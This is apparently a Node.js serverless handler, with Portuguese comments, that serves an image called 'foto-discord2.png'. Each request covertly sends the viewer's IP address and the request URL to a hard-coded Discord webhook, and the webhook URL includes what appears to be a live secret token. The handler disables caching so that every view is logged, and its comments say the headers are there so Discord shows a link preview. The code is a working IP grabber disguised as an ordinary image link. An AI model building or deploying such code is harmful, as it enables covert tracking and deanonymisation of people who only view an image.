import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // 1. CAPTURA IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  console.log('📸 foto-discord2.png - IP:', ip);
  
  // 2. DISCORD WEBHOOK
  const webhook = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `📸 **foto-discord2.png**\n🌐 IP: ${ip}\n🔗 ${req.url}`
      })
    });
  } catch (e) {}
  
  // 3. USA SEMPRE foto-discord2.png
  const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
  
  try {
    const fotoBuffer = fs.readFileSync(fotoPath);
    
    // HEADERS para Discord mostrar preview
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', fotoBuffer.length);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    res.send(fotoBuffer);
    
  } catch (error) {
    console.log('❌ Erro:', error.message);
    
    // Fallback
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
  }
}
